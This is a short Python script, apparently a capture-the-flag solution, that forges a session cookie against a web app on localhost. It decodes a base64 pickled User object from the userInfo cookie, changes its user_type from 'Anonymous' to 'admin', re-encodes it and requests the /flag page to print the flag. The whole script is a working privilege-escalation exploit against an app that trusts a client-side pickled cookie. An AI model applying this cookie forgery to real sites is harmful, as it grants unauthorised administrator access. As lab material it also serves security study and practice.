from requests import *
from pickle import *
from base64 import b64encode, b64decode
from bs4 import BeautifulSoup

class User:
    def __init__(self, user_type):
    	self.user_type = user_type

c = "gASVNAAAAAAAAACMCF9fbWFpbl9flIwEVXNlcpSTlCmBlH2UjAl1c2VyX3R5cGWUjAlBbm9ueW1vdXOUc2Iu"
c = loads(b64decode(c))
c.user_type = "admin"

c = b64encode(dumps(c)).decode()

cookie = {
    "userInfo" : c
}
# print(cookie)

s = BeautifulSoup(get("http://localhost:8081/flag", cookies=cookie).text, "html.parser")

print(s.find_all("h1")[0].contents[0])

